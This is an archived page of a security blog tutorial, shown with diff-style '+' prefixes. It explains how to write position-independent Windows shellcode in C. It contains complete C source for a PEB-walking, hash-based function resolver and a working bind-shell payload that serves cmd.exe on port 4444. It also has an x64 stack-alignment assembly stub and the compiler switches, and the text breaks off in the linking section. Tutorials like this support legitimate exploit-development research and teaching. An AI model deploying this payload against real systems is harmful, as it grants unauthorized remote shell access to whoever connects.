+	  <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
+	  Web crawl data from Common Crawl.
+	</div>
+	      </div>
+    </div>
+    </div>
+    <div id="wm-capinfo-timestamps">
+    <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center" title="Timestamps for the elements of this page">TIMESTAMPS</div>
+    <div>
+      <div id="wm-capresources" style="margin:0 5px 5px 5px;max-height:250px;overflow-y:scroll !important"></div>
+      <div id="wm-capresources-loading" style="text-align:left;margin:0 20px 5px 5px;display:none"><img src="https://web.archive.org/_static/images/loading.gif" alt="loading"></div>
+    </div>
+    </div>
+  </div></div></div><link rel="stylesheet" type="text/css" href="./Writing Optimized Windows Shellcode in C_files/banner-styles.css"><link rel="stylesheet" type="text/css" href="./Writing Optimized Windows Shellcode in C_files/iconochive.css"><div class="wb-autocomplete-suggestions " style="left: 0px; top: 3900px; width: 0px;"></div></template>
+</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html</div>
+<script type="text/javascript">//<![CDATA[
+__wm.bt(700,27,25,2,"web","http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html","20210305190309",1996,"/_static/",["/_static/css/banner-styles.css?v=S1zqJCYt","/_static/css/iconochive.css?v=qtvMKcIJ"], false);
+  __wm.rw(1);
+//]]></script>
+<!-- END WAYBACK TOOLBAR INSERT -->
+ 
+<div class="navbar section" id="navbar" name="Navbar"><div class="widget Navbar" data-version="1" id="Navbar1"><script type="text/javascript">
+    function setAttributeOnload(object, attribute, val) {
+      if(window.addEventListener) {
+        window.addEventListener('load',
+          function(){ object[attribute] = val; }, false);
+      } else {
+        window.attachEvent('onload', function(){ object[attribute] = val; });
+      }
+    }
+  </script>
+<div id="navbar-iframe-container"><iframe ng-non-bindable="" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" style="" tabindex="0" vspace="0" width="100%" id="navbar-iframe" name="navbar-iframe" src="./Writing Optimized Windows Shellcode in C_files/navbar.html" allow="autoplay &#39;self&#39;; fullscreen &#39;self&#39;"></iframe></div>
+<script type="text/javascript" src="./Writing Optimized Windows Shellcode in C_files/plusone.js.download" gapi_processed="true"></script>
+<script type="text/javascript">
+      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
+        if (gapi.iframes && gapi.iframes.getContext) {
+          gapi.iframes.getContext().openChild({
+              url: 'https://web.archive.org/web/20210305190309/https://www.blogger.com/navbar.g?targetBlogID\x3d6052198192158185644\x26blogName\x3dExploit+Monday\x26publishMode\x3dPUBLISH_MODE_HOSTED\x26navbarType\x3dDARK\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttp://www.exploit-monday.com/search\x26blogLocale\x3den\x26v\x3d2\x26homepageUrl\x3dhttp://www.exploit-monday.com/\x26targetPostID\x3d299909111219502438\x26blogPostOrPageUrl\x3dhttp://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html\x26vt\x3d7008660129499820516',
+              where: document.getElementById("navbar-iframe-container"),
+              id: "navbar-iframe"
+          });
+        }
+      });
+    </script><script type="text/javascript">
+(function() {
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = '//web.archive.org/web/20210305190309/http://pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
+var head = document.getElementsByTagName('head')[0];
+if (head) {
+head.appendChild(script);
+}})();
+</script>
+</div></div>
+<div class="body-fauxcolumns">
+<div class="fauxcolumn-outer body-fauxcolumn-outer">
+<div class="cap-top">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+<div class="fauxborder-left">
+<div class="fauxborder-right"></div>
+<div class="fauxcolumn-inner">
+</div>
+</div>
+<div class="cap-bottom">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+</div>
+</div>
+<div class="content">
+<div class="content-fauxcolumns">
+<div class="fauxcolumn-outer content-fauxcolumn-outer">
+<div class="cap-top">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+<div class="fauxborder-left">
+<div class="fauxborder-right"></div>
+<div class="fauxcolumn-inner">
+</div>
+</div>
+<div class="cap-bottom">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+</div>
+</div>
+<div class="content-outer">
+<div class="content-cap-top cap-top">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+<div class="fauxborder-left content-fauxborder-left">
+<div class="fauxborder-right content-fauxborder-right"></div>
+<div class="content-inner">
+<header>
+<div class="header-outer">
+<div class="header-cap-top cap-top">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+<div class="fauxborder-left header-fauxborder-left">
+<div class="fauxborder-right header-fauxborder-right"></div>
+<div class="region-inner header-inner">
+<div class="header section" id="header" name="Header"><div class="widget Header" data-version="1" id="Header1">
+<div id="header-inner">
+<div class="titlewrapper">
+<h1 class="title">
+<a href="https://web.archive.org/web/20210305190309/http://www.exploit-monday.com/">
+Exploit Monday
+</a>
+</h1>
+</div>
+<div class="descriptionwrapper">
+<p class="description"><span>Security Research and Esoteric PowerShell Knowledge</span></p>
+</div>
+</div>
+</div></div>
+</div>
+</div>
+<div class="header-cap-bottom cap-bottom">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+</div>
+</header>
+<div class="tabs-outer">
+<div class="tabs-cap-top cap-top">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+<div class="fauxborder-left tabs-fauxborder-left">
+<div class="fauxborder-right tabs-fauxborder-right"></div>
+<div class="region-inner tabs-inner">
+<div class="tabs no-items section" id="crosscol" name="Cross-Column"></div>
+<div class="tabs no-items section" id="crosscol-overflow" name="Cross-Column 2"></div>
+</div>
+</div>
+<div class="tabs-cap-bottom cap-bottom">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+</div>
+<div class="main-outer">
+<div class="main-cap-top cap-top">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+<div class="fauxborder-left main-fauxborder-left">
+<div class="fauxborder-right main-fauxborder-right"></div>
+<div class="region-inner main-inner">
+<div class="columns fauxcolumns">
+<div class="fauxcolumn-outer fauxcolumn-center-outer">
+<div class="cap-top">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+<div class="fauxborder-left">
+<div class="fauxborder-right"></div>
+<div class="fauxcolumn-inner">
+</div>
+</div>
+<div class="cap-bottom">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+</div>
+<div class="fauxcolumn-outer fauxcolumn-left-outer">
+<div class="cap-top">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+<div class="fauxborder-left">
+<div class="fauxborder-right"></div>
+<div class="fauxcolumn-inner">
+</div>
+</div>
+<div class="cap-bottom">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+</div>
+<div class="fauxcolumn-outer fauxcolumn-right-outer">
+<div class="cap-top">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+<div class="fauxborder-left">
+<div class="fauxborder-right"></div>
+<div class="fauxcolumn-inner">
+</div>
+</div>
+<div class="cap-bottom">
+<div class="cap-left"></div>
+<div class="cap-right"></div>
+</div>
+</div>
+<!-- corrects IE6 width calculation -->
+<div class="columns-inner">
+<div class="column-center-outer">
+<div class="column-center-inner">
+<div class="main section" id="main" name="Main"><div class="widget Blog" data-version="1" id="Blog1">
+<div class="blog-posts hfeed">
+
+          <div class="date-outer">
+        
+<h2 class="date-header"><span>Friday, August 16, 2013</span></h2>
+
+          <div class="date-posts">
+        
+<div class="post-outer">
+<div class="post hentry">
+<a name="299909111219502438"></a>
+<h3 class="post-title entry-title">
+Writing Optimized Windows Shellcode in C
+</h3>
+<div class="post-header">
+<div class="post-header-line-1"></div>
+</div>
+<div class="post-body entry-content" id="post-body-299909111219502438">
+Download: <a href="https://web.archive.org/web/20210305190309/https://github.com/mattifestation/PIC_Bindshell" target="_blank">PIC_Bindshell</a><br>
+<br>
+<strong><u><span style="font-size: large;">Introduction</span></u></strong><br>
+<br>
+I’ll be the first to admit: writing shellcode sucks. While you have the advantage of employing some cool tricks to minimize the size of your payload, writing shellcode is still error prone&nbsp;and difficult to maintain. For example, I find it quite challenging having to track register allocations (especially in x86) and ensure proper stack alignment (especially in x86_64). Eventually, I got fed up, stepped back, and asked myself, “Why can’t I just write my shellcode payloads in C and let the compiler and linker take care of the rest?” That way, you only have to write your payload once and you can target it to any architecture – x86, x86_64, and ARM. Also, you would have the following added benefits:<br>
+<ol>
+<li>You can subject your payload to static analysis tools.</li>
+<li>You can unit test your code.</li>
+<li>You can employ heavy compiler and linker optimizations to your payload.</li>
+<li>The compiler is much better at optimizing assembly for size and/or speed than you are.</li>
+<li>You can write your payload in Visual Studio. Intellisense, FTW!</li>
+</ol>
+Now, you could say I’m a bit of a Microsoft fan boy. That said, considering the majority of the shellcode I’ve written has been for Windows, I decided to take on the challenge of using only Microsoft tools to emit position independent shellcode. The fundamental challenge however, is that the Microsoft C compiler – cl.exe does not emit position independent code (with the exception of Itanium). Ultimately, to achieve this goal, we’re going to have to rely upon some C coding tricks and some carefully crafted compiler and linker switches.<br>
+<br>
+<strong><u><span style="font-size: large;">Shellcode – Back to the Basics</span></u></strong><br>
+<br>
+When writing shellcode, whether you do it in C or assembly, the following rules apply:<br>
+<br>
+1) It must be position independent.<br>
+<br>
+In most cases, you cannot know a priori&nbsp;the address at which&nbsp;your shellcode is going to land. Therefore, all branching instructions and instructions that dereference memory must be executed relative to the base address of where you were loaded. The gcc compiler has the option of emitting position independent code (PIC) but unfortunately, Microsoft’s compiler does not.<br>
+<br>
+2) Your payload is on the hook for resolving external references.<br>
+<br>
+If you want your payload to do anything useful, at some point, you’re going to have to call Win32 API functions. In your typical executable, external symbolic references are satisfied in one of two ways: either they are resolved by the loader at startup by walking the import directory of the executable or they are resolved dynamically at runtime using GetProcAddress. Shellcode neither has the luxury of being loaded by a loader nor can it just call GetProcAddress since it has no idea what the address of kernel32!GetProcAddress is in the first place – a classic chicken and the egg problem.<br>
+<br>
+In order to resolve the addresses of library functions, shellcode must resolve function names on its own. This is typically accomplished in shellcode with a function that takes a 32-bit module and function hash, gets the PEB (Process Environment Block) address, walks a linked list of the loaded modules, scans the export directory of each module, hashes each function name, compares it against the hash provided, and if there is a match, the function address is calculated by adding its RVA to the base address of the loaded module. I’m obviously glossing over the details of the process in the interest of space but fortunately, this process is widely used (e.g. in Metasploit) and well documented.<br>
+<br>
+3) Your payload must save stack and register state upon entry and restore state upon exiting the shellcode.<br>
+<br>
+We will get this for free by writing the payload in C by virtue of having function prologs and epilogs emitted by the compiler for each function.<br>
+<br>
+<strong><u><span style="font-size: large;">GetProcAddressWithHash Function in C</span></u></strong><br>
+<br>
+In the download provided, the GetProcAddressWithHash function resolves Win32 API exported function addresses. I adapted the logic of the function from the <a href="https://web.archive.org/web/20210305190309/https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank">Metasploit block_api</a> assembly function:<br>
+<br>
+<pre><textarea readonly="readonly" rows="133" wrap="off">#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+
+// This compiles to a ROR instruction
+// This is needed because _lrotr() is an external reference
+// Also, there is not a consistent compiler intrinsic to accomplish this across all three platforms.
+#define ROTR32(value, shift) (((DWORD) value &gt;&gt; (BYTE) shift) | ((DWORD) value &lt;&lt; (32 - (BYTE) shift)))
+
+// Redefine PEB structures. The structure definitions in winternl.h are incomplete.
+typedef struct _MY_PEB_LDR_DATA {
+    ULONG Length;
+ BOOL Initialized;
+ PVOID SsHandle;
+ LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+ LIST_ENTRY InInitializationOrderModuleList;
+} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;
+
+typedef struct _MY_LDR_DATA_TABLE_ENTRY
+{
+ LIST_ENTRY InLoadOrderLinks;
+ LIST_ENTRY InMemoryOrderLinks;
+ LIST_ENTRY InInitializationOrderLinks;
+ PVOID DllBase;
+ PVOID EntryPoint;
+ ULONG SizeOfImage;
+ UNICODE_STRING FullDllName;
+ UNICODE_STRING BaseDllName;
+} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;
+
+HMODULE GetProcAddressWithHash( _In_ DWORD dwModuleFunctionHash )
+{
+ PPEB PebAddress;
+ PMY_PEB_LDR_DATA pLdr;
+ PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
+ PVOID pModuleBase;
+ PIMAGE_NT_HEADERS pNTHeader;
+ DWORD dwExportDirRVA;
+ PIMAGE_EXPORT_DIRECTORY pExportDir;
+ PLIST_ENTRY pNextModule;
+ DWORD dwNumFunctions;
+ USHORT usOrdinalTableIndex;
+ PDWORD pdwFunctionNameBase;
+ PCSTR pFunctionName;
+ UNICODE_STRING BaseDllName;
+ DWORD dwModuleHash;
+ DWORD dwFunctionHash;
+ PCSTR pTempChar;
+ DWORD i;
+
+#if defined(_WIN64)
+ PebAddress = (PPEB) __readgsqword( 0x60 );
+#elif defined(_M_ARM)
+ // I can assure you that this is not a mistake. The C compiler improperly emits the proper opcodes
+ // necessary to get the PEB.Ldr address
+ PebAddress = (PPEB) ( (ULONG_PTR) _MoveFromCoprocessor(15, 0, 13, 0, 2) + 0);
+ __emit( 0x00006B1B );
+#else
+ PebAddress = (PPEB) __readfsdword( 0x30 );
+#endif
+
+ pLdr = (PMY_PEB_LDR_DATA) PebAddress-&gt;Ldr;
+ pNextModule = pLdr-&gt;InLoadOrderModuleList.Flink;
+ pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pNextModule;
+
+ while (pDataTableEntry-&gt;DllBase != NULL)
+ {
+  dwModuleHash = 0;
+  pModuleBase = pDataTableEntry-&gt;DllBase;
+  BaseDllName = pDataTableEntry-&gt;BaseDllName;
+  pNTHeader = (PIMAGE_NT_HEADERS) ((ULONG_PTR) pModuleBase + ((PIMAGE_DOS_HEADER) pModuleBase)-&gt;e_lfanew);
+  dwExportDirRVA = pNTHeader-&gt;OptionalHeader.DataDirectory[0].VirtualAddress;
+
+  // Get the next loaded module entry
+  pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pDataTableEntry-&gt;InLoadOrderLinks.Flink;
+
+  // If the current module does not export any functions, move on to the next module.
+  if (dwExportDirRVA == 0)
+  {
+   continue;
+  }
+
+  // Calculate the module hash
+  for (i = 0; i &lt; BaseDllName.MaximumLength; i++)
+  {
+   pTempChar = ((PCSTR) BaseDllName.Buffer + i);
+
+   dwModuleHash = ROTR32( dwModuleHash, 13 );
+
+   if ( *pTempChar &gt;= 0x61 )
+   {
+    dwModuleHash += *pTempChar - 0x20;
+   }
+   else
+   {
+    dwModuleHash += *pTempChar;
+   }
+  }
+
+  pExportDir = (PIMAGE_EXPORT_DIRECTORY) ((ULONG_PTR) pModuleBase + dwExportDirRVA);
+
+  dwNumFunctions = pExportDir-&gt;NumberOfNames;
+  pdwFunctionNameBase = (PDWORD) ((PCHAR) pModuleBase + pExportDir-&gt;AddressOfNames);
+
+  for (i = 0; i &lt; dwNumFunctions; i++)
+  {
+   dwFunctionHash = 0;
+   pFunctionName = (PCSTR) (*pdwFunctionNameBase + (ULONG_PTR) pModuleBase);
+   pdwFunctionNameBase++;
+
+   pTempChar = pFunctionName;
+
+   do
+   {
+    dwFunctionHash = ROTR32( dwFunctionHash, 13 );
+    dwFunctionHash += *pTempChar;
+    pTempChar++;
+   } while (*(pTempChar - 1) != 0);
+
+   dwFunctionHash += dwModuleHash;
+
+   if (dwFunctionHash == dwModuleFunctionHash)
+   {
+    usOrdinalTableIndex = *(PUSHORT)(((ULONG_PTR) pModuleBase + pExportDir-&gt;AddressOfNameOrdinals) + (2 * i));
+    return (HMODULE) ((ULONG_PTR) pModuleBase + *(PDWORD)(((ULONG_PTR) pModuleBase + pExportDir-&gt;AddressOfFunctions) + (4 * usOrdinalTableIndex)));
+   }
+  }
+ }
+
+ // All modules have been exhausted and the function was not found.
+ return NULL;
+}</textarea></pre>
+<br>
+Going from top to bottom, you may notice a few things:<br>
+<br>
+• I defined ROTR32 as a macro.<br>
+<br>
+The Metasploit payload uses a rotate-right hashing function. Unfortunately, there is no rotate right operator in C. There are several rotate right compiler instrinsics but they are not consistent across&nbsp;processor architectures. The ROTR32 macro implements the logic of a rotate right operation using the equivalent logical operators available to us in C. What’s cool, is that the compiler will recognize that this macro performs a rotate right operation and it will actually compile down to a single rotate right assembly instruction. That’s pretty bas ass, in my opinion.<br>
+<br>
+• I redefine two structure definitions.<br>
+<br>
+Both of those structure are defined in winternl.h but Microsoft’s public definition is incomplete so I simply redefined the structures with the fields I needed.<br>
+<br>
+• There is a different method of getting the PEB address depending upon the processor architecture you’re targeting.<br>
+<br>
+The PEB address is the first step in resolving exported function addresses. The PEB is a structure that contains several pointers to the loaded modules of a process. In x86 and x86_64, the PEB address is obtained by dereferencing an offset into the fs and gs segment registers, respectively. On ARM, the PEB address obtained by reading a specific register from the system control processor (CP15). Fortunately, there is a respective compiler intrinsic for each processor architecture. For whatever reason though, the compiler was not emitting correct ARM assembly instruction so I had to tweak instructions in a very counterintuitive manner.<br>
+<br>
+<strong><u><span style="font-size: large;"> Implementing Your Primary Payload in C</span></u></strong><br>
+<br>
+I’m going to be using a simple bind shell payload as an example for this post. Here is my implementation in C:<br>
+<br>
+<pre><textarea readonly="readonly" rows="144" wrap="off">#define WIN32_LEAN_AND_MEAN
+
+#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'
+
+#include "GetProcAddressWithHash.h"
+#include "64BitHelper.h"
+#include &lt;windows.h&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;intrin.h&gt;
+
+#define BIND_PORT 4444
+#define HTONS(x) ( ( (( (USHORT)(x) ) &gt;&gt; 8 ) &amp; 0xff) | ((( (USHORT)(x) ) &amp; 0xff) &lt;&lt; 8) )
+
+// Redefine Win32 function signatures. This is necessary because the output
+// of GetProcAddressWithHash is cast as a function pointer. Also, this makes
+// working with these functions a joy in Visual Studio with Intellisense.
+typedef HMODULE (WINAPI *FuncLoadLibraryA) (
+ _In_z_ LPTSTR lpFileName
+);
+
+typedef int (WINAPI *FuncWsaStartup) (
+ _In_ WORD wVersionRequested,
+ _Out_ LPWSADATA lpWSAData
+);
+
+typedef SOCKET (WINAPI *FuncWsaSocketA) (
+ _In_  int af,
+ _In_  int type,
+ _In_  int protocol,
+ _In_opt_ LPWSAPROTOCOL_INFO lpProtocolInfo,
+ _In_  GROUP g,
+ _In_  DWORD dwFlags
+);
+
+typedef int (WINAPI *FuncBind) (
+ _In_ SOCKET s,
+ _In_ const struct sockaddr *name,
+ _In_ int namelen
+);
+
+typedef int (WINAPI *FuncListen) (
+ _In_ SOCKET s,
+ _In_ int backlog
+);
+
+typedef SOCKET (WINAPI *FuncAccept) (
+ _In_  SOCKET s,
+ _Out_opt_ struct sockaddr *addr,
+ _Inout_opt_ int *addrlen
+);
+
+typedef int (WINAPI *FuncCloseSocket) (
+ _In_ SOCKET s
+);
+
+typedef BOOL (WINAPI *FuncCreateProcess) (
+ _In_opt_ LPCTSTR lpApplicationName,
+ _Inout_opt_ LPTSTR lpCommandLine,
+ _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
+ _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+ _In_  BOOL bInheritHandles,
+ _In_  DWORD dwCreationFlags,
+ _In_opt_ LPVOID lpEnvironment,
+ _In_opt_ LPCTSTR lpCurrentDirectory,
+ _In_  LPSTARTUPINFO lpStartupInfo,
+ _Out_  LPPROCESS_INFORMATION lpProcessInformation
+);
+
+typedef DWORD (WINAPI *FuncWaitForSingleObject) (
+ _In_ HANDLE hHandle,
+ _In_ DWORD dwMilliseconds
+);
+
+// Write the logic for the primary payload here
+// Normally, I would call this 'main' but if you call a function 'main', link.exe requires that you link against the CRT
+// Rather, I will pass a linker option of "/ENTRY:ExecutePayload" in order to get around this issue.
+VOID ExecutePayload( VOID )
+{
+ FuncLoadLibraryA MyLoadLibraryA;
+ FuncWsaStartup MyWSAStartup;
+ FuncWsaSocketA MyWSASocketA;
+ FuncBind MyBind;
+ FuncListen MyListen;
+ FuncAccept MyAccept;
+ FuncCloseSocket MyCloseSocket;
+ FuncCreateProcess MyCreateProcessA;
+ FuncWaitForSingleObject MyWaitForSingleObject;
+ WSADATA WSAData;
+ SOCKET s;
+ SOCKET AcceptedSocket;
+ struct sockaddr_in service;
+ STARTUPINFO StartupInfo;
+ PROCESS_INFORMATION ProcessInformation;
+ // Strings must be treated as a char array in order to prevent them from being stored in
+ // an .rdata section. In order to maintain position independence, all data must be stored
+ // in the same section. Thanks to Nick Harbour for coming up with this technique:
+ // http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
+ char cmdline[] = { 'c', 'm', 'd', 0 };
+ char module[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
+
+ // Initialize structures. SecureZeroMemory is forced inline and doesn't call an external module
+ SecureZeroMemory(&amp;StartupInfo;, sizeof(StartupInfo));
+ SecureZeroMemory(&amp;ProcessInformation;, sizeof(ProcessInformation));
+
+ #pragma warning( push )
+ #pragma warning( disable : 4055 ) // Ignore cast warnings
+ // Should I be validating that these return a valid address? Yes... Meh.
+ MyLoadLibraryA = (FuncLoadLibraryA) GetProcAddressWithHash( 0x0726774C );
+
+ // You must call LoadLibrary on the winsock module before attempting to resolve its exports.
+ MyLoadLibraryA((LPTSTR) module);
+
+ MyWSAStartup = (FuncWsaStartup) GetProcAddressWithHash( 0x006B8029 );
+ MyWSASocketA = (FuncWsaSocketA) GetProcAddressWithHash( 0xE0DF0FEA );
+ MyBind = (FuncBind) GetProcAddressWithHash( 0x6737DBC2 );
+ MyListen = (FuncListen) GetProcAddressWithHash( 0xFF38E9B7 );
+ MyAccept = (FuncAccept) GetProcAddressWithHash( 0xE13BEC74 );
+ MyCloseSocket = (FuncCloseSocket) GetProcAddressWithHash( 0x614D6E75 );
+ MyCreateProcessA = (FuncCreateProcess) GetProcAddressWithHash( 0x863FCC79 );
+ MyWaitForSingleObject = (FuncWaitForSingleObject) GetProcAddressWithHash( 0x601D8708 );
+ #pragma warning( pop )
+
+ MyWSAStartup( MAKEWORD( 2, 2 ), &amp;WSAData; );
+ s = MyWSASocketA( AF_INET, SOCK_STREAM, 0, NULL, 0, 0 );
+
+ service.sin_family = AF_INET;
+ service.sin_addr.s_addr = 0; // Bind to 0.0.0.0
+ service.sin_port = HTONS( BIND_PORT );
+
+ MyBind( s, (SOCKADDR *) &amp;service;, sizeof(service) );
+ MyListen( s, 0 );
+ AcceptedSocket = MyAccept( s, NULL, NULL );
+ MyCloseSocket( s );
+
+ StartupInfo.hStdError = (HANDLE) AcceptedSocket;
+ StartupInfo.hStdOutput = (HANDLE) AcceptedSocket;
+ StartupInfo.hStdInput = (HANDLE) AcceptedSocket;
+ StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+ StartupInfo.cb = 68;
+
+ MyCreateProcessA( 0, (LPTSTR) cmdline, 0, 0, TRUE, 0, 0, 0, &amp;StartupInfo;, &amp;ProcessInformation; );
+ MyWaitForSingleObject( ProcessInformation.hProcess, INFINITE );
+}</textarea></pre>
+<br>
+There are a few things I needed to be mindful of while writing the payload in order to satisfy the requirements imposed by position independent shellcode:<br>
+<br>
+• I defined HTONS as a macro.<br>
+<br>
+It was easier to define this as a macro versus incurring the overhead of calling ws2_32.dll!htons. Besides, HTONS is ideally suited for a macro since all it does is convert a USHORT from host to network byte order.<br>
+<br>
+• I had to manually define the function signatures for each Win32 API function.<br>
+<br>
+This was necessary since each call to GetProcAddressWithHash needs to be cast to a function pointer. Also, with Intellisense, calling the function has the look and feel of calling&nbsp;a normal&nbsp;Win32 function in Visual Studio. This part is admittedly a pain in the ass. It certainly beats the guess and check method though&nbsp;when writing assembly by hand!<br>
+<br>
+• "ExecutePayload" is the function that implements the primary logic of the bind shell.<br>
+<br>
+Normally, you would call the function "main". One of the problems I ran into though is that when the linker encounters a function named “main,” it expects to be linked against the C runtime library. Obviously, shellcode shouldn’t and doesn’t require the CRT so renaming the entry point to something besides “main” and explicitly telling the linker your entry point function obviates the need to link against the CRT.<br>
+<br>
+• “cmd” and “ws2_32.dll” are explicitly defined as null-terminated character arrays.<br>
+<br>
+This technique was first <a href="https://web.archive.org/web/20210305190309/http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/" target="_blank">described by Nick Harbour</a> as a way to force the compiler to allocate strings on the stack. By default, strings are stored in the .rdata section of a binary and relocations are defined in the executable for any references to those strings. Storing strings on the stack allows for references to be made in a position independent manner.<br>
+<br>
+• SecureZeroMemory is used to initialize stack variables<br>
+<br>
+SecureZeroMemory is basically a memset that cannot be compiled out. It is also an inline function meaning I am spared the overhead of having to resolve the address of memset.<br>
+<br>
+• The rest of the payload, is your typical, run-of-the-mill C… only slightly malicious.<br>
+<br>
+<strong><u><span style="font-size: large;">Ensuring Proper Stack Alignment in 64-bit Shellcode</span></u></strong><br>
+<br>
+32-bit architectures (i.e. x86 and ARMv7) require that function calls be made with 4-byte stack alignment. It is pretty much guaranteed that your shellcode will land with 4-byte alignment. 64-bit shellcode however,&nbsp;needs to have 16-byte stack alignment. This is&nbsp;due to a requirement imposed by&nbsp;utilizing 128-bit XMM registers. Those who have written 64-bit shellcode have most likely experienced crashes at an instruction using an XMM register upon calling Win32 a function. This is due to stack misalignment.<br>
+<br>
+Executable files, when loaded are afforded the luxury of having guaranteed alignment during CRT initialization. Shellcode is afforded no such luxury, however. So, in order to ensure that my shellcode hits its entry point with proper stack alignment on 64-bit, I had to write a short assembly stub that guaranteed alignment. Then, as a pre-build event in Visual Studio, I assemble the shellcode with ml64 (MASM – the Microsoft Assembler) and specify the resulting object file as a dependency for the linker.<br>
+<br>
+Here is the code that performs the alignment:<br>
+<br>
+<pre><textarea readonly="readonly" rows="29" wrap="off">EXTRN ExecutePayload:PROC
+PUBLIC  AlignRSP   ; Marking AlignRSP as PUBLIC allows for the function
+     ; to be called as an extern in our C code.
+
+_TEXT SEGMENT
+
+; AlignRSP is a simple call stub that ensures that the stack is 16-byte aligned prior
+; to calling the entry point of the payload. This is necessary because 64-bit functions
+; in Windows assume that they were called with 16-byte stack alignment. When amd64
+; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
+; if your shellcode lands with 8-byte stack alignment, any call to a Win32 function will likely
+; crash upon calling any ASM instruction that utilizes XMM registers (which require 16-byte)
+; alignment.
+
+AlignRSP PROC
+ push rsi    ; Preserve RSI since we're stomping on it
+ mov  rsi, rsp  ; Save the value of RSP so it can be restored
+ and  rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
+ sub  rsp, 020h  ; Allocate homing space for ExecutePayload
+ call ExecutePayload ; Call the entry point of the payload
+ mov  rsp, rsi  ; Restore the original value of RSP
+ pop  rsi    ; Restore RSI
+ ret      ; Return to caller
+AlignRSP ENDP
+
+_TEXT ENDS
+
+END</textarea></pre>
+<br>
+Basically, what’s happening here is I am preserving the original stack value, and’ing RSP (the stack pointer) to achieve 16-byte alignment, allocating <a href="https://web.archive.org/web/20210305190309/http://www.codemachine.com/article_x64deepdive.html" target="_blank">homing space</a>, and then calling the original entry point – ExecutePayload (i.e. the bind shell code).<br>
+<br>
+I also have a small helper function in C that simply calls AlignRSP:<br>
+<br>
+<pre><textarea readonly="readonly" rows="10" wrap="off">#if defined(_WIN64)
+extern VOID AlignRSP( VOID );
+
+VOID Begin( VOID )
+{
+ // Call the ASM stub that will guarantee 16-byte stack alignment.
+ // The stub will then call the ExecutePayload.
+ AlignRSP();
+}
+#endif</textarea></pre>
+<br>
+This little helper function will then serve as the new entry point that will be specified to the linker. I will explain shortly why this wrapper function is necessary.<br>
+<br>
+<strong><u><span style="font-size: large;">Compiling the Shellcode</span></u></strong><br>
+<br>
+I use the following compiler (cl.exe) command line switches in my Visual Studio 2012 project:<br>
+<br>
+<span style="font-family: &quot;Courier New&quot;, Courier, monospace;">/GS- /TC /GL /W4 /O1 /nologo /Zl /FA /Os</span><br>
+<br>
+Each switch warrants an explanation as it is relevant to the shellcode that will be generated.<br>
+<br>
+/GS-: Disables stack buffer overrun checks. If enabled, external stack cookie setter and getter functions would be called which would no longer make the shellcode position independent.<br>
+<br>
+/TC: Tells the compiler to treat all files as C source files. One of the quirks of this command-line switch is that <em>all</em> local variables <em>must</em> be defined at the beginning of a function. If they are not, unintuitive errors will occur when attempting to compile.<br>
+<br>
+/GL: Whole program optimization. This option tells the linker (via the /LTGC option) to optimize across function calls. I chose this option because I just really like the idea of fully-optimized shellcode. :D<br>
+<br>
+/W4: Enables the highest warning level. This is just good practice.<br>
+<br>
+/O1: Tells the compiler to favor small code over fast code – an ideal attribute of shellcode.<br>
+<br>
+/FA: Outputs an assembly listing. This is optional. I just prefer to validate the assembly code emitted by the compiler.<br>
+<br>
+/Zl: Omit the default C runtime library name from the resulting object file. This serves to tell the linker that you don’t intend to link against the C runtime.<br>
+<br>
+/Os: Another way to tell the compiler to favor small code.<br>
+<br>
+<strong><u><span style="font-size: large;">Linking the Shellcode</span></u></strong><br>
+<br>
+The following linker (link.exe) switches are used for x86/ARM and x86_64, respectively:<br>
+<br>
